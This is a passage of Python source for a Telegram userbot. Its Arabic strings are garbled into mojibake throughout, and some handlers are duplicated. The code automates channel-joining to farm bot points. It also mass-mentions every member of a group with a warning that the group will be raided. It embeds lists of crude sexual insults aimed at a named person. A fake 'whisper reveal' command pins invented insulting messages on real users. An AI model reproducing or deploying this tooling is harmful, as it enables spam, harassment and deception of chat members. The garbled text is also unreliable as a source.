            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@yynnurybot'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß


@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸáÿØŸàŸäŸàŸÜ|.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸáÿØŸàŸäŸàŸÜ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ŸÖŸáÿØŸàŸäŸàŸÜ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@MHDN313bot')
    await event.client.send_message('@MHDN313bot', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MHDN313bot', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
                bott = url.split('/')[-1]
                await event.client(ImportChatInviteRequest(bott))
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@MHDN313bot', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        bot_username = '@MHDN313bot'  # ÿßÿ≥ÿ™ÿ®ÿØŸÑ '@ŸäŸàÿ≤ÿ±_ÿßŸÑÿ®Ÿàÿ™' ÿ®ŸäŸàÿ≤ÿ± ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØŸá
        await event.client.send_message(bot_username, "/start")
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿ™ÿ®ŸàŸäÿ® ŸáŸÜÿß
         
@client.on(events.NewMessage(outgoing=True, pattern=r'\.(ÿ≠ÿ∏ÿ±|ÿ∑ÿ±ÿØ|ÿ™ŸÇŸäŸäÿØ)'))
async def runkick(event):
    await event.edit("ÿ¨ÿßÿ±Ÿç...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ.")
                            return
            else:  
                await event.respond("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿßÿ™ŸÖÿßŸÖ ÿßŸÑÿßŸÖÿ±")
                return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    getreason = event.message.raw_text.splitlines()
    replacecmd = getreason[0].replace(f".{command} ", "")
    reason = replacecmd.splitlines()[0]
    client.parse_mode = "html"

    try:
        if command == "ÿ∑ÿ±ÿØ":
            await event.client.kick_participant(messagelocation, targetuser)
            action = "ÿ™ŸÖ ÿ∑ÿ±ÿØŸá"
        elif command == "ÿ≠ÿ∏ÿ±":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=True)))
            action = "ÿ™ŸÖ ÿ≠ÿ∏ÿ±Ÿá"
        elif command == "ÿ™ŸÇŸäŸäÿØ":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, send_messages=True)))
            action = "ÿ™ŸÖ ÿ™ŸÇŸäŸäÿØŸá"

        if reason:
            if f".{command}" in reason:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")
            else:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}\nÿ≥ÿ®ÿ®: {reason}")
        else:
            await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")


@client.on(events.NewMessage(outgoing=True, pattern=r'\.(ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≠ÿ∏ÿ±|ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ)'))
async def unrunkick(event):
    await event.edit("ÿ¨ÿßÿ±Ÿç...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ.")
                            return
            else: 
                await event.respond(". Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ")
                return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    client.parse_mode = "html"

    try:
        await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=False, send_messages=False)))

        if command == "ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≠ÿ∏ÿ±":
            action = "ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ±Ÿá"
        elif command == "ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ":
            action = "ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØŸá"

        await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

    client.parse_mode = "markdown"  
                                                                    
@client.on(events.NewMessage(pattern="ÿ™ŸÅŸÑŸäÿ¥(?:\s|$)([\s\S]*)"))
async def kickall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await edit_or_reply(event, "** ‚éôÔ∏ô Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± Ÿäÿ≥ÿ™ÿπŸÖŸÑ ŸÑŸÑŸÇŸÜŸàÿßÿ™ ŸàÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ŸÅŸÇÿ∑ !**")
    msg = "ÿ™ÿ≠ÿ∞Ÿäÿ±: Ÿáÿ∞ÿß ÿßŸÑŸÉÿ±Ÿàÿ® ÿ£Ÿà ÿßŸÑŸÇŸÜÿßÿ© ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÅŸÑŸäÿ¥Ÿá!"
    async for usr in client.iter_participants(chat_id):
        userb = usr.username
        usrtxt = f"{msg} @{userb}"
        if str(userb) == "None":
            userb = usr.id
            usrtxt = f"{msg} {userb}"
        await client.send_message(chat_id, usrtxt)
        await asyncio.sleep(1)
    await event.delete()                                                                          

Z = ["ÿßŸÜŸäŸÉ ÿ¥ÿßÿØŸà ÿßŸÑŸÖÿπÿ±ÿµ", "ŸÉÿ≥ŸÖŸá ÿ¥ÿßÿØŸà", "ÿßŸÜŸäŸÉ ÿßŸÖŸÉ Ÿä ÿ¥ÿßÿØŸà", "ÿßŸÖŸÉ ŸÇÿ≠ÿ®Ÿá Ÿä ÿ¥ÿßÿØŸà"]

@client.on(events.NewMessage(pattern=".ÿ¥ÿßÿØŸà$"))
async def ithker(knopis):
    await knopis.edit(random.choice(Z))

@client.on(events.NewMessage(pattern=".ÿ±ŸÅÿπ ŸÖÿßŸÑŸÉ(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑÿ≠ŸÑŸà** „Äå[{JoKeRUB}](tg://user?id={user.id})„Äç \n**‚éôÔ∏ô ÿ™ŸÄŸÖ ÿ±ŸÅÿπŸá ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention}")

rehu = [
    "ÿ¥ŸÉŸÖ ŸÖÿ±Ÿá ŸÉÿ™ŸÑŸÉ ÿÆŸÑŸä ŸÜŸÅŸÑÿ¥ ÿßŸÑŸÉÿ±Ÿàÿ®",
    "ÿ®ÿßÿπ Ÿáÿ∞ÿß ÿßŸÑŸÑŸàŸÉŸä ÿ¥ÿØŸäÿ≥ŸàŸä",
    "** ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® Ÿàÿßÿ≠ÿØ ÿ≤ÿ®ÿßŸÑŸá ŸàŸäÿØŸàÿ± ÿ®ŸÜÿßÿ™ **",
    "**ÿßŸàŸÑ ŸÖÿ±Ÿá ÿßÿ¥ŸàŸÅ ÿ®ŸÜÿßÿ™ ŸäÿØŸàÿ±ŸÜ ŸàŸÑÿØ üòÇ **",
    "**ÿ¥ŸàŸÅ Ÿáÿ∞ÿß ÿßŸÑŸÉÿ±ŸÜÿ¨ ÿØŸäŸÜ ŸÖÿ∂ÿßŸÑ ÿ®ÿ±ÿßÿ≥Ÿá**",
    "**ÿßŸÜÿ™Ÿá Ÿàÿßÿ≠ÿØ ŸÅÿ±ÿÆ Ÿàÿ™ŸÜŸäÿ¨**",
    "** ÿ±ÿßÿ≠ ÿßÿπÿ™ÿ±ŸÅŸÑŸÉ ÿ®ÿ¥Ÿä ÿ∑ŸÑÿπÿ™ ÿßÿ≠ÿ® ÿßÿÆÿ™ŸÉ ü•∫ **",
    "**ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® ŸàÿßŸÑŸÖÿ¥ÿ±ŸÅŸäŸÜ ŸàŸÅÿ±ÿØŸá ŸÖŸÜ ŸÇŸÜÿØÿ±ÿ™ŸÉ ÿ∂ŸÑÿπŸä**",
    "**Ÿáÿ∞ÿß Ÿàÿßÿ≠ÿØ ÿ∫ÿ´Ÿäÿ´ ŸàŸÉŸÑÿ® ÿßÿ®ŸÜ ŸÉŸÑÿ®**",
    "**ŸÑÿ™ÿ≠ÿ¨Ÿä ŸÉÿØÿßŸÖŸá Ÿáÿ∞ÿß ŸÜÿ∫ŸÑ ŸäŸàÿµŸÑ ÿ≠ÿ¨Ÿä**",
    "**Ÿáÿ∞ÿß ÿßŸÑŸÖÿßŸÑŸÉ Ÿàÿßÿ≠ÿØ ÿ≥ÿßŸÇÿ∑ ŸàŸÇÿ±ÿßŸÖ ŸàŸäÿØŸàÿ± ÿ≠ŸÑŸàŸäŸÜ**",
    "**ŸÑŸà ÿ±ÿ®ŸÉ Ÿäÿ¨Ÿä ŸÖÿßÿ™ŸÜŸÉÿ¥ŸÅ ÿßŸÑŸáŸÖÿ≥Ÿá üòÇüòÇ**",
]

aljoker_enabled = True
hussein_enabled = True

async def get_user_from_event(event):
    if event.sender_id in (1087968824, 1036953733, 1062351279, 1067578920, 1067564781):
        return None
    if event.is_private:
        return await event.get_sender()
    if event.is_group:
        return await event.get_chat()
    return None

@client.on(events.NewMessage(pattern="ŸáŸÖÿ≥Ÿá(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    lMl10l = random.choice(rehu)
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**·ØΩÔ∏ôÿßŸÑŸáŸÖÿ≥ÿ© ŸÖŸÜ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ [{JoKeRUB}](tg://user?id={user.id}) ÿ™ŸÖ ŸÉÿ¥ŸÅŸáÿß ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**\n**·ØΩÔ∏ô ÿßŸÑŸáŸÖÿ≥ÿ© ŸáŸä : {lMl10l} ** ")

@client.on(events.NewMessage(pattern="mark_as_read"))
async def mark_as_read(event):
    if aljoker_enabled:
        await event.mark_read()

@client.on(events.NewMessage(pattern="Hussein"))
async def Hussein(event):
    if hussein_enabled:
        await event.reply("Hussein")
var = {}

async def edit_delete(event, text):
    await event.edit(text)
    await asyncio.sleep(5)
    await event.delete()

@client.on(events.NewMessage(pattern="(ÿÆÿ∑ ÿßŸÑÿ∫ÿßŸÖŸÇ|ÿÆÿ∑ ÿ∫ÿßŸÖŸÇ|ÿÆÿ∑ ÿßŸÑŸÖÿ¥ÿ∑Ÿàÿ®|ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®|ÿÆÿ∑ ÿ±ŸÖÿ≤|ÿÆÿ∑ ÿßŸÑÿ±ŸÖÿ≤|ÿÆÿ∑ ÿßŸÑÿ®ÿßŸäÿ´ŸàŸÜ|ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ)"))
async def change_font(event):
    font_types = {
        "ÿÆÿ∑ ÿßŸÑÿ∫ÿßŸÖŸÇ": "bold",
        "ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®": "tshwesh",
        "ÿÆÿ∑ ÿ±ŸÖÿ≤": "ramz",
        "ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ": "joker"
    }
    font_type = font_types.get(event.pattern_match.group(1))
    if font_type:
        if var.get(font_type, None) == "on":
            var.pop(font_type)  # ÿ™ÿµÿ≠Ÿäÿ≠ ÿßŸÑÿÆÿ∑ÿ£ ŸáŸÜÿß
            await edit_delete(event, f"**·ØΩÔ∏ô ÿ™ŸÖ ÿßÿ∑ŸÅÿßÿ° {event.pattern_match.group(1)} ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì **")
        else:
            var[font_type] = "on"
            await edit_delete(event, f"**·ØΩÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ {event.pattern_match.group(1)} ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")

@client.on(events.NewMessage(outgoing=True))
async def reda(event):
    if event.message.text and not event.message.media and event.message.text.count(".") != 1 and event.message.text.count("@") != 1:
        font_types = {
            "bold": "**{}**",
            "tshwesh": "~~{}~~",
            "ramz": "`{}`",
            "joker": "```{}```",
  }
        for font_type, font_format in font_types.items():
            if var.get(font_type, None) == "on":
                try:
                    await event.edit(font_format.format(event.message.text))
                except MessageIdInvalidError:
                    pass
        
@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ$"))
async def stop_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        del tr_status[chat_id]
    await event.edit("**ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ.**", parse_mode="md")


@client.on(events.NewMessage(outgoing=True, pattern='\.ŸäŸàÿ™ (.+)'))
async def tconv(event):
    chat = await event.get_chat()
    sentence_to_summarize = event.pattern_match.group(1)
    if sentence_to_summarize.startswith("."):
        sentence_to_summarize = sentence_to_summarize[1:].strip()
    sentence_to_summarize = "ŸäŸàÿ™ " + sentence_to_summarize
    await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿßŸÜÿ™ÿ∏ÿßÿ±...")
    try:
        x = await client.send_message('@x_h_9bot', sentence_to_summarize)
        async with client.conversation('@x_h_9bot') as conv:
            audio_clip = None
            timeout = 15
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < timeout:
                response = await conv.get_response(x.id)
                await client.send_read_acknowledge(conv.chat_id)
                if "ÿπŸÑŸäŸÉ ÿßŸÑÿ£ÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜÿßÿ© ÿßŸÑÿ®Ÿàÿ™" in response.message:
                    try:
                        channel_name = re.search(r"ŸÇŸÜÿßÿ© ÿßŸÑÿ®Ÿàÿ™ : (@\w+)", response.message).group(1)
                        await client(JoinChannelRequest(channel_name))
                        x = await client.send_message('@x_h_9bot', sentence_to_summarize)
                    except Exception as e:
                        print(f"ÿÆÿ∑ÿ£: {e}")
                if response.audio:
                    audio_clip = response
                    break
            if audio_clip:
                new_message = Message(
                    id=0,
                    peer_id=chat,
                    message="",
                    media=audio_clip.media,
                    entities=None,
                    reply_markup=None,
                    ttl_period=None
                )
                await client.send_message(chat, new_message, silent=True)
                await event.delete()
                await asyncio.sleep(0)  # ÿßŸÑÿßŸÜÿ™ÿ∏ÿßÿ± ŸÑŸÖÿØÿ© 60 ÿ´ÿßŸÜŸäÿ©
                try:
                    await client(DeleteHistoryRequest(peer='@x_h_9bot', max_id=x.id, just_clear=False, revoke=True))
                except MessageIdInvalidError:
                    print("ÿÆÿ∑ÿ£: ŸÑÿß ŸäŸÖŸÉŸÜ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
            else:
                await event.edit("ÿßŸÑŸÖÿ≠ÿ™ŸàŸâ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ")
    except Exception as e:
        print(f"ÿÆÿ∑ÿ£: {e}")
        await event.edit("ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿπŸÖŸÑŸäÿ©")

@client.on(events.NewMessage(outgoing=True, pattern='\.ÿ≥ŸàÿßŸÑ (.*)'))
async def tco(event):
    chat = await event.get_chat()
    question = event.pattern_match.group(1)
    await event.edit("ÿ¨ÿßÿ±Ÿç ÿ¨ŸÖÿπ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™ ÿßŸÜÿ™ÿ∏ÿ± 7 ÿ´ŸàÿßŸÜ ...")

    async with client.conversation('@SAMI_PAI_BOT') as conv:
        await conv.send_message(question)

        await asyncio.sleep(7)

        # ÿßŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ±ÿØŸäŸÜ ŸÖŸÜ ÿßŸÑÿ®Ÿàÿ™
        response1 = await conv.get_response()
        response2 = await conv.get_response()

        
        if response1.text == "‚åõÔ∏è Forming a response ...":
            xx = response2  # ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ´ÿßŸÜŸäÿ© 
        else:
            xx = response1  # ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ£ŸàŸÑŸâ

        text_without_links = re.sub(r'http\S+', '', xx.text)

        await client.send_read_acknowledge(conv.chat_id)
        await client.send_message(chat, text_without_links)
        await event.message.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿ≠ŸÖŸÑ (.+)'))
async def download_media(event):
    chat = await event.get_chat()
    link = event.pattern_match.group(1)
    message_to_delete = await event.edit("ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ...")

    async with client.conversation('@aaazzjbot') as conv:
        try:
            await conv.send_message(link)

            @client.on(events.NewMessage(from_users='@aaazzjbot'))
            async def handle_response(event):
                if event.media:
                    if event.grouped_id:
                        for photo in event.media.photos:
                            await client.send_file(chat, photo)
                    else:
                        await client.send_file(chat, event.media)

                    # ÿ≠ÿ∞ŸÅ ÿ±ÿ≥ÿßŸÑÿ© "ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸÖŸäŸÑ..."
                    await message_to_delete.delete()

                    # ÿßŸÜÿ™ÿ∏ÿßÿ± 3 ÿ´ŸàÿßŸÜŸä ŸÇÿ®ŸÑ ÿ≠ÿ∞ŸÅ ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ©
                    await asyncio.sleep(3)

                    try:
                        await client(functions.messages.DeleteHistoryRequest(
                            peer='@aaazzjbot',
                            max_id=event.message.id,
                            revoke=True
                        ))
                    except Exception as e:
                        print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

                client.remove_event_handler(handle_response)

            try:
                await asyncio.wait_for(
                    client.loop.create_task(conv.get_response()),
                    timeout=10
                )
            except asyncio.TimeoutError:
                await event.edit("ÿßÿ≥ŸÅ ŸäÿßÿµÿØŸäŸÇŸä ŸÑŸÖ ÿßÿ¨ÿØ ÿ¥Ÿäÿ¶ÿß")
                client.remove_event_handler(handle_response)

        except Exception as e:
            print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")
            await event.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

afk_mode = False   
custom_reply = "ÿ£ŸÜÿß ŸÑÿ≥ÿ™ ŸÖŸàÿ¨ŸàÿØŸãÿß ÿßŸÑÿ¢ŸÜÿå ÿ£ÿ±ÿ¨ŸàŸÉ ÿßÿ™ÿ±ŸÉ ÿ±ÿ≥ÿßŸÑÿ™ŸÉ ŸàÿßŸÜÿ™ÿ∏ÿ± ŸÑÿ≠ŸäŸÜ ÿπŸàÿØÿ™Ÿä."
reply_to_message = None
custom_replies = {}  
custom_replies_enabled = False  
allowed_chats = set()

try:
    with open('custom_replies.pickle', 'rb') as f:
        custom_replies = pickle.load(f)
except FileNotFoundError:
    pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ$'))
async def enable_afk(event):
    global afk_mode
    afk_mode = True
    await event.edit("ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑŸÖÿÆÿµÿµ ÿ™ÿ¥ÿ∫ŸäŸÑ$'))
async def enable_custom_replies(event):
    global custom_replies_enabled
    custom_replies_enabled = True
    await event.edit("ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ$'))
async def disable_replies(event):
    global afk_mode, custom_replies_enabled
    afk_mode = False
    custom_replies_enabled = False
    await event.edit("ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ŸàÿßŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ$'))
async def set_reply_template(event):
    global reply_to_message
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        await event.edit(f"ÿ™ŸÖ ÿ™ÿπŸäŸäŸÜ ŸÉŸÑŸäÿ¥ÿ© ÿßŸÑÿ±ÿØ ÿ•ŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑŸÖÿ≠ÿØÿØÿ©.")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸáÿß ŸÉŸÉŸÑŸäÿ¥ÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿ±ÿØ (.*)'))
async def add_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        reply_text = event.pattern_match.group(1).strip()
        if len(custom_replies) < 20:
            custom_replies[trigger_text] = reply_text
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
